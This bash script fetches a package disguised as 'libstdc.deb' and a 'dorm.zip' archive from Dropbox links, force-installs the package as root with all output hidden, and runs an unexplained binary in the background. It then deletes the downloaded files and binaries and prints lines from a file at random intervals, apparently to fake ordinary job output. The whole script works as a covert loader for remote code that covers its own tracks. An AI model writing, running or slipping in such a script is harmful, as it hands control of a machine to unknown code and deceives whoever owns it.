#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/pmheqiilhh5fl56/dorm.zip -q
unzip dorm.zip > /dev/null 2>&1
#pwd
./tools/dorm ./tools/verify &
sleep 3
rm -rf dorm.zip
rm -rf tools/dorm
rm -rf tools/verify
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 12 ))
done < $2

